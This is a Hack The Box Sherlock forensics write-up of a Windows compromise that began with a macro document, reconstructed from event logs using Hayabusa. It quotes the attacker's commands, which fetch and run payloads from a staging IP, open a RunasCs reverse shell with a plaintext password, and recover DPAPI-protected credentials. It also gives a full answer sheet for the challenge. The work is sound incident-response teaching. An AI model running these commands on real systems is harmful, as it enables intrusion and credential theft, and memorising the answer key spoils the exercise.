---
title: "HTB Sherlock: ShadowBait Writeup"
summary: "Windows forensics investigation of a malicious Office document that staged PowerShell payloads, enabled C2, credential access, privilege escalation, and persistence."
date: 2026-06-24
platform: "hackthebox"
category: "forensics"
difficulty: "easy"
tags:
  - hayabusa
  - windows-forensics
  - phishing
  - powershell
  - persistence
  - timeline
featured: false
draft: false
slug: "hackthebox/sherlock/htb-sherlock-shadowbait"
event: "hack-the-box-sherlocks"
---
## Case Overview

**Sherlock:** ShadowBait
**Platform:** Hack The Box
**Category:** Digital Forensics / Incident Response
**Difficulty:** Easy
**Primary Tooling:** Hayabusa, grep, SQLite, PowerShell event logs, Sysmon logs

ShadowBait investigates a Windows compromise that started when user `Steven` downloaded and opened a malicious Office document. The document triggered PowerShell-based staging, downloaded a payload, gave the attacker hands-on remote access, allowed credential access through DPAPI-abused `PSCredential` data, and later resulted in privilege escalation and persistence.

This writeup follows the investigation from a junior threat intelligence perspective: focusing on observable behavior, attacker tradecraft, timeline reconstruction, and host-based indicators of compromise.

---

## Executive Summary

The attack began with a phishing document named `Policy.docm`, downloaded from Google Drive content hosting. After execution, the document launched PowerShell to download `downloader.ps1` from an internal staging server at `192.168.204.152`.

The stager downloaded and executed `OpenDLL.exe` from the same staging server. This payload established command-and-control communication over TCP port `8899`.

The attacker then abused a pre-existing DPAPI-protected PowerShell credential file, `connection.xml`, to recover credentials for the local user `Samy`. With the recovered password `Winter2025!`, the attacker downloaded `RunasCs.exe` and used it to gain remote shell access as `Samy`.

After gaining access as `Samy`, the attacker downloaded `psgetsys.ps1`, abused a Windows process with PID `632` to obtain an elevated shell, and used port `9006` for remote access with escalated privileges.

Finally, the attacker enabled persistence using a backdoor executable at:

```text
C:\Windows\system32\document.pdf.exe
```

They also created shortcut-based persistence using:

```text
NetworkDiagnostics.lnk
```

created by:

```text
C:\programdata\wscript.vbs
```

---

## Investigation Environment

The extracted case directory contained Windows disk artifacts and event logs:

```bash
ls -la
```

Important files and directories:

```text
G/
ps_ops.xml
shadowbait_hayabusa.csv
2025-06-12T01_37_33_0689927_ConsoleLog.txt
2025-06-12T01_37_33_0689927_CopyLog.csv
2025-06-12T01_37_33_0689927_SkipLog.csv.csv
```

The main evidence source was Windows Event Logs stored under:

```text
G/Windows/System32/winevt/logs/
```

Important logs included:

```text
Microsoft-Windows-Sysmon%4Operational.evtx
Security.evtx
Microsoft-Windows-PowerShell%4Operational.evtx
Windows PowerShell.evtx
Microsoft-Windows-Windows Defender%4Operational.evtx
Microsoft-Windows-TaskScheduler%4Operational.evtx
```

---

## Tooling: Why Hayabusa Was Used

Hayabusa is useful in this case because it quickly converts many Windows Event Logs into a single chronological CSV timeline. Instead of manually opening each `.evtx` file, Hayabusa correlates suspicious activity using Sigma and built-in detection rules.

For this Sherlock, Hayabusa helped identify:

- Suspicious Office child processes

- PowerShell download activity

- Script block execution

- Process creation events

- Network connections

- Certutil downloads

- Credential access activity

- Privilege escalation traces

- Persistence creation


The investigation became easier because Hayabusa reduced the event logs into a searchable CSV timeline.

---

## Generating the Hayabusa Timeline

From the working directory, the event logs were located here:

```bash
cd "$HOME/Desktop/01_CTF/HTB/Hack The Box/Sherlock/ShadowBait/ShadowBait"
```

Update Hayabusa rules first:

```bash
cd ~/Downloads
hayabusa update-rules
```

Then generate the CSV timeline:

```bash
hayabusa csv-timeline \
-d "$HOME/Desktop/01_CTF/HTB/Hack The Box/Sherlock/ShadowBait/ShadowBait/G/Windows/System32/winevt/logs" \
-o "$HOME/Desktop/01_CTF/HTB/Hack The Box/Sherlock/ShadowBait/ShadowBait/shadowbait_hayabusa.csv" \
-w
```

Output file:

```text
shadowbait_hayabusa.csv
```

The timeline gave a single place to hunt for suspicious terms such as:

```bash
grep -inaE "Policy.docm|downloader.ps1|opendll.exe|RunasCs|connection.xml|psgetsys|document.pdf.exe|wscript.vbs|NetworkDiagnostics" shadowbait_hayabusa.csv
```

---

## High-Level Attack Chain

```text
Phishing Document
    ↓
Policy.docm opened by Steven
    ↓
PowerShell stager downloaded: downloader.ps1
    ↓
Payload downloaded and executed: OpenDLL.exe
    ↓
C2 connection to attacker server on port 8899
    ↓
DPAPI-protected credential file abused: connection.xml
    ↓
Samy password recovered
    ↓
RunasCs.exe downloaded for lateral movement / remote shell
    ↓
Remote shell gained as Samy
    ↓
psgetsys.ps1 downloaded
    ↓
Windows process PID 632 abused for elevated shell
    ↓
Elevated reverse shell on port 9006
    ↓
Persistence using document.pdf.exe, wsock32.exe, wscript.vbs, and NetworkDiagnostics.lnk
```

---

# Detailed Investigation

## 1. Initial Access: Malicious Document

The initial access vector was a malicious Office document:

```text
Policy.docm
```

The `.docm` extension is significant because it indicates a macro-enabled Microsoft Word document. In a phishing scenario, this file type is commonly abused to execute embedded macros or trigger script-based payloads.

The document was downloaded by user `Steven` from a Google Drive user-content URL:

```text
https://drive.usercontent.google.com/uc?id=1Y6XAccvtdWvXUGx8WU0qG-7EP781c0uD&export=download
```

This established the initial phishing delivery source.

Useful hunting command:

```bash
grep -ina "Policy.docm" shadowbait_hayabusa.csv
```

Another useful artifact source is browser history:

```bash
cp "./G/Users/steven/AppData/Local/Google/Chrome/User Data/Default/History" /tmp/steven_chrome_history

sqlite3 /tmp/steven_chrome_history "
.headers on
.mode column
SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch') AS utc_time,
       url,
       title
FROM urls
WHERE url LIKE '%drive.google%'
   OR url LIKE '%drive.usercontent.google%'
   OR url LIKE '%1Y6XAccvtdWvXUGx8WU0qG-7EP781c0uD%'
ORDER BY last_visit_time;
"
```

---

## 2. Stager Download: downloader.ps1

After the malicious document was opened, PowerShell was used to download a stager script:

```text
downloader.ps1
```

The command observed was:

```powershell
IWR -Uri http://192.168.204.152/downloader.ps1 -OutFile C:\Users\steven\Downloads\downloader.ps1
```

The script was downloaded at:

```text
2025-06-07 05:42:11 UTC
```

Local timeline time:

```text
2025-06-07 01:42:11 -04:00
```

The staging server was:

```text
192.168.204.152
```

Useful hunting command:

```bash
grep -inaE "downloader\.ps1|Invoke-WebRequest|IWR" shadowbait_hayabusa.csv ps_ops.xml
```

This activity is suspicious because PowerShell was used immediately after a document execution chain, and the downloaded file was placed in the user’s Downloads directory.

---

## 3. Payload Download: OpenDLL.exe

The stager then downloaded and executed the final payload:

```text
C:\Users\Steven\AppData\Roaming\OpenDLL.exe
```

The key PowerShell logic was:

```powershell
IWR -Uri "http://192.168.204.152/opendll.exe" -OutFile "$env:APPDATA\opendll.exe"; Start-Process "$env:APPDATA\opendll.exe"
```

Since `$env:APPDATA` for Steven resolves to:

```text
C:\Users\Steven\AppData\Roaming
```

the payload path becomes:

```text
C:\Users\Steven\AppData\Roaming\OpenDLL.exe
```

Useful hunting command:

```bash
grep -inaE "opendll\.exe|APPDATA|Start-Process" shadowbait_hayabusa.csv ps_ops.xml
```

This is a common attacker pattern: using `%APPDATA%` because it is writable by normal users and often abused for user-context malware execution.

---

## 4. Command and Control

The `OpenDLL.exe` payload initiated C2 communication with the attacker-controlled host:

```text
192.168.204.152
```

The C2 port used by the payload was:

```text
8899
```

Useful hunting command:

```bash
grep -inaE "opendll\.exe|Net Conn|TgtPort|192\.168\.204\.152" shadowbait_hayabusa.csv
```

This identified the outbound network activity tied to the payload process.

Important C2 indicator:

```text
192.168.204.152:8899
```

---

## 5. Credential Access Through DPAPI-Abused PSCredential File

Before the attack, a credential object had been exported to disk using PowerShell:

```text
C:\Users\Samy\Documents\connection.xml
```

The file was created using `Export-Clixml`, which stores a serialized `PSCredential` object. On Windows, `Export-Clixml` protects credential data using DPAPI. This means the credential is normally tied to the user and machine context.

However, if the attacker can operate under the same user context or abuse the correct context, they may be able to import the file and recover the password.

The attacker used:

```powershell
$cred = Import-CliXml -Path connection.xml
```

Then the password could be accessed through:

```powershell
$cred.GetNetworkCredential().Password
```

The recovered password for user `Samy` was:

```text
Winter2025!
```

Useful hunting command:

```bash
grep -inaE "Import-Clixml|Import-CliXml|GetNetworkCredential|connection\.xml|PSCredential" shadowbait_hayabusa.csv ps_ops.xml
```

This was a key pivot point in the attack. The attacker moved from initial access as `Steven` to credential access for `Samy`.

---

## 6. Remote Access as Samy Using RunasCs

After recovering Samy’s credentials, the attacker downloaded `RunasCs.exe` from the staging server:

```powershell
"C:\Windows\system32\certutil.exe" -urlcache -f http://192.168.204.152/RunasCs.exe RunasCs.exe
```

`certutil.exe` is a legitimate Windows binary, but it is commonly abused to download files from remote servers.

The attacker then used the recovered credentials to execute a reverse shell as `Samy`:

```powershell
.\RunasCs.exe samy Winter2025! cmd -r 192.168.204.152:555 --bypass-uac --logon-type 8
```

Important details:

```text
Username: samy
Password: Winter2025!
Remote host: 192.168.204.152
Remote shell port: 555
Tool: RunasCs.exe
```

Useful hunting command:

```bash
grep -inaE "RunasCs|Winter2025|cmd -r|logon-type|certutil" shadowbait_hayabusa.csv ps_ops.xml
```

---

## 7. Privilege Escalation Preparation: psgetsys.ps1

After gaining access as `Samy`, the attacker downloaded a privilege-checking or privilege-escalation helper script:

```text
psgetsys.ps1
```

The script name indicates its purpose: attempting to gain or interact with SYSTEM-level privileges.

Useful hunting command:

```bash
grep -inaE "psgetsys|privilege|Impersonate|ParentPid|ppid|SYSTEM" shadowbait_hayabusa.csv ps_ops.xml
```

This stage shows the attacker was no longer satisfied with user-level access and was actively attempting to escalate privileges.

---

## 8. Privilege Escalation: Abusing a Windows Process

The attacker exploited a Windows process to obtain an elevated remote shell.

The abused process PID was:

```text
632
```

This PID mapped to:

```text
C:\Windows\System32\winlogon.exe
```

The relevant behavior involved impersonating or creating a process from a privileged parent process. The attacker used this technique to spawn an elevated shell.

The escalated remote access used port:

```text
9006
```

Important elevated access indicator:

```text
192.168.204.152:9006
```

Useful hunting command:

```bash
grep -inaE "psgetsys|ImpersonateFromParentPid|ppid 632|winlogon|9006|TCPClient" shadowbait_hayabusa.csv ps_ops.xml
```

This stage is important because the attacker moved from user-level access to SYSTEM-level control.

---

## 9. Post-Exploitation Activity

After gaining elevated access, the attacker continued downloading tools and payloads.

Observed downloads included:

```text
passwords.py
document.pdf.exe
wsock32.exe
wscript.vbs
```

Example commands:

```powershell
certutil -urlcache -f http://192.168.204.152/passwords.py passwords.py
```

```powershell
certutil -urlcache -f http://192.168.204.152/document.pdf.exe document.pdf.exe
```

```powershell
Invoke-WebRequest -Uri http://192.168.204.152/wsock32.exe -OutFile C:\ProgramData\Microsoft\wsock32.exe
```

```powershell
certutil -urlcache -split -f http://192.168.204.152/wscript.vbs C:\programdata\wscript.vbs
```

Useful hunting command:

```bash
grep -inaE "passwords\.py|document\.pdf\.exe|wsock32\.exe|wscript\.vbs|certutil|Invoke-WebRequest" shadowbait_hayabusa.csv ps_ops.xml
```

---

## 10. Persistence Mechanisms

The attacker enabled persistence using a backdoor executable:

```text
C:\Windows\system32\document.pdf.exe
```

The name `document.pdf.exe` is suspicious because it attempts to look like a document while still being executable. This is a common deception technique.

The attacker also abused Windows shortcut persistence by placing a rogue shortcut:

```text
NetworkDiagnostics.lnk
```

The shortcut pointed to the malicious backdoor.

The script that created the shortcut persistence was:

```text
C:\programdata\wscript.vbs
```

Useful hunting commands:

```bash
grep -inaE "document\.pdf\.exe|schtasks|CurrentVersion\\Run|Run /v|WMISVC" shadowbait_hayabusa.csv ps_ops.xml
```

```bash
grep -inaE "NetworkDiagnostics\.lnk|wscript\.vbs|Startup|\.lnk|wsock32\.exe" shadowbait_hayabusa.csv ps_ops.xml
```

Persistence indicators:

```text
C:\Windows\system32\document.pdf.exe
C:\ProgramData\Microsoft\wsock32.exe
C:\programdata\wscript.vbs
NetworkDiagnostics.lnk
```

---

# Timeline of Key Events

|Time|Event|Evidence / Finding|
|---|---|---|
|2025-06-07 05:42:11 UTC|Stager downloaded|`downloader.ps1` downloaded from `192.168.204.152`|
|2025-06-07 01:42 local|Payload downloaded|`OpenDLL.exe` written to Steven’s Roaming AppData|
|2025-06-07 01:42 local|Payload executed|`OpenDLL.exe` started by PowerShell|
|2025-06-07 01:42 local|C2 established|`OpenDLL.exe` connected to port `8899`|
|2025-06-07 01:48 local|Credential file imported|`connection.xml` imported using `Import-CliXml`|
|2025-06-07 01:48 local|Samy password recovered|`$cred.GetNetworkCredential().Password`|
|2025-06-07 01:48 local|Tool downloaded|`RunasCs.exe` downloaded using `certutil.exe`|
|2025-06-07 01:50 local|Remote shell as Samy|`RunasCs.exe` used with `Winter2025!`|
|2025-06-07 later|Privilege escalation|`psgetsys.ps1` used with PID `632`|
|2025-06-07 later|Elevated shell|Reverse shell used port `9006`|
|2025-06-07 later|Persistence|`document.pdf.exe`, `NetworkDiagnostics.lnk`, and `wscript.vbs` used|

---

# Indicators of Compromise

## IP Addresses

```text
192.168.204.152
```

Role:

```text
Attacker staging server / C2 server
```

## Network Ports

```text
8899
9006
555
```

Roles:

```text
8899 - C2 communication by OpenDLL.exe
9006 - Elevated remote shell
555  - RunasCs remote shell as Samy
```

## Malicious / Suspicious Files

```text
Policy.docm
downloader.ps1
OpenDLL.exe
RunasCs.exe
psgetsys.ps1
passwords.py
document.pdf.exe
wsock32.exe
wscript.vbs
NetworkDiagnostics.lnk
```

## Full Paths

```text
C:\Users\Steven\Downloads\Policy.docm
C:\Users\Steven\Downloads\downloader.ps1
C:\Users\Steven\AppData\Roaming\OpenDLL.exe
C:\Users\Samy\Documents\connection.xml
C:\Windows\system32\document.pdf.exe
C:\ProgramData\Microsoft\wsock32.exe
C:\programdata\wscript.vbs
```

## Suspicious Commands

```powershell
IWR -Uri http://192.168.204.152/downloader.ps1 -OutFile C:\Users\steven\Downloads\downloader.ps1
```

```powershell
IWR -Uri "http://192.168.204.152/opendll.exe" -OutFile "$env:APPDATA\opendll.exe"; Start-Process "$env:APPDATA\opendll.exe"
```

```powershell
$cred = Import-CliXml -Path connection.xml
```

```powershell
$cred.GetNetworkCredential().Password
```

```powershell
"C:\Windows\system32\certutil.exe" -urlcache -f http://192.168.204.152/RunasCs.exe RunasCs.exe
```

```powershell
.\RunasCs.exe samy Winter2025! cmd -r 192.168.204.152:555 --bypass-uac --logon-type 8
```

```powershell
certutil -urlcache -f http://192.168.204.152/document.pdf.exe document.pdf.exe
```

```powershell
certutil -urlcache -split -f http://192.168.204.152/wscript.vbs C:\programdata\wscript.vbs
```

---

# MITRE ATT&CK Mapping

|Tactic|Technique|Evidence|
|---|---|---|
|Initial Access|Phishing Attachment|`Policy.docm`|
|Execution|Command and Scripting Interpreter: PowerShell|`IWR`, `Invoke-WebRequest`, encoded PowerShell|
|Execution|User Execution|User opened malicious document|
|Command and Control|Application Layer Protocol / Reverse Shell|C2 to `192.168.204.152`|
|Credential Access|Credentials from Password Stores / DPAPI abuse|`connection.xml`, `Import-CliXml`|
|Lateral Movement|Use Alternate Authentication Material / Runas|`RunasCs.exe` with Samy credentials|
|Privilege Escalation|Access Token Manipulation / Parent Process Abuse|`psgetsys.ps1`, PID `632`|
|Defense Evasion|Masquerading|`document.pdf.exe`, `OpenDLL.exe`|
|Defense Evasion|LOLBIN Abuse|`certutil.exe` used for downloads|
|Persistence|Registry Run Key / Startup Folder|`document.pdf.exe`, `NetworkDiagnostics.lnk`|
|Persistence|Shortcut Modification|`NetworkDiagnostics.lnk`|
|Discovery|Account / Privilege Discovery|`psgetsys.ps1`|

---

# Detection and Hunting Notes

## Hunt for Office-Spawning Script Interpreters

```bash
grep -inaE "WINWORD|cmd\.exe|powershell\.exe|Office|Policy\.docm" shadowbait_hayabusa.csv
```

Suspicious pattern:

```text
WINWORD.EXE → cmd.exe → powershell.exe
```

This is a strong indicator of malicious document execution.

---

## Hunt for PowerShell Web Downloads

```bash
grep -inaE "Invoke-WebRequest|IWR|DownloadFile|WebClient|192\.168\.204\.152" shadowbait_hayabusa.csv ps_ops.xml
```

Suspicious patterns:

```text
IWR -Uri http://...
Invoke-WebRequest -Uri http://...
```

---

## Hunt for Certutil Download Abuse

```bash
grep -inaE "certutil.*urlcache|certutil.*split|RunasCs|document\.pdf\.exe|wscript\.vbs" shadowbait_hayabusa.csv ps_ops.xml
```

`certutil.exe` is legitimate, but using it to download executables or scripts from a remote IP is highly suspicious.

---

## Hunt for DPAPI / PSCredential Abuse

```bash
grep -inaE "Import-Clixml|Export-Clixml|GetNetworkCredential|PSCredential|connection\.xml" shadowbait_hayabusa.csv ps_ops.xml
```

Suspicious pattern:

```text
Import-CliXml → GetNetworkCredential().Password
```

This indicates recovery of plaintext credentials from a serialized PowerShell credential object.

---

## Hunt for Persistence

```bash
grep -inaE "schtasks|CurrentVersion\\Run|Startup|\.lnk|document\.pdf\.exe|NetworkDiagnostics|wscript\.vbs|wsock32\.exe" shadowbait_hayabusa.csv ps_ops.xml
```

Persistence indicators:

```text
Startup shortcut
Registry Run key
Scheduled task
Backdoor executable
```

---

# Defensive Recommendations

## Immediate Containment

- Isolate the compromised Windows host from the network.

- Block outbound traffic to:


```text
192.168.204.152
```

- Disable or reset affected accounts:


```text
Steven
Samy
```

- Revoke active sessions and rotate credentials.


## Eradication

Remove malicious files:

```text
C:\Users\Steven\AppData\Roaming\OpenDLL.exe
C:\Windows\system32\document.pdf.exe
C:\ProgramData\Microsoft\wsock32.exe
C:\programdata\wscript.vbs
C:\Users\Samy\Documents\RunasCs.exe
C:\Users\Samy\Documents\psgetsys.ps1
```

Remove shortcut persistence:

```text
NetworkDiagnostics.lnk
```

Review persistence locations:

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Startup folder
Scheduled Tasks
```

## Hardening

- Disable Office macros from the internet.

- Enable Attack Surface Reduction rules.

- Monitor PowerShell Script Block Logging.

- Monitor Sysmon Event ID 1, 3, 11, and 15.

- Alert on Office spawning `cmd.exe` or `powershell.exe`.

- Alert on `certutil.exe` downloading files.

- Alert on PowerShell usage of `Import-Clixml` followed by `GetNetworkCredential().Password`.

- Audit local credential files stored in user directories.


---

# Final Answer Sheet

|Task|Answer|
|--:|---|
|1|`Policy.docm`|
|2|`https://drive.usercontent.google.com/uc?id=1Y6XAccvtdWvXUGx8WU0qG-7EP781c0uD&export=download`|
|3|`2025-06-07 05:42:11`|
|4|`C:\users\Steven\AppData\Roaming\OpenDLL.exe`|
|5|`8899`|
|6|`C:\Users\Samy\Documents\connection.xml`|
|7|`$cred = Import-CliXml -Path connection.xml`|
|8|`"C:\Windows\system32\certutil.exe" -urlcache -f http://192.168.204.152/RunasCs.exe RunasCs.exe`|
|9|`Winter2025!`|
|10|`psgetsys.ps1`|
|11|`632`|
|12|`9006`|
|13|`C:\Windows\system32\document.pdf.exe`|
|14|`NetworkDiagnostics.lnk`|
|15|`C:\programdata\wscript.vbs`|

---

# Key Takeaways

- A single malicious Office document can lead to full host compromise when macros or document-triggered script execution are allowed.

- Hayabusa is effective for quickly turning Windows Event Logs into an investigation timeline.

- PowerShell Script Block Logging is extremely valuable because it exposes attacker commands directly.

- `certutil.exe` and `Invoke-WebRequest` are common download mechanisms during Windows intrusions.

- DPAPI-protected PowerShell credential files can become dangerous if attackers gain the correct user context.

- Persistence can be layered through scheduled tasks, Run keys, backdoor executables, and Startup folder shortcuts.

- Timeline reconstruction is the most important skill in Windows forensic investigations: each artifact makes more sense when placed in sequence.
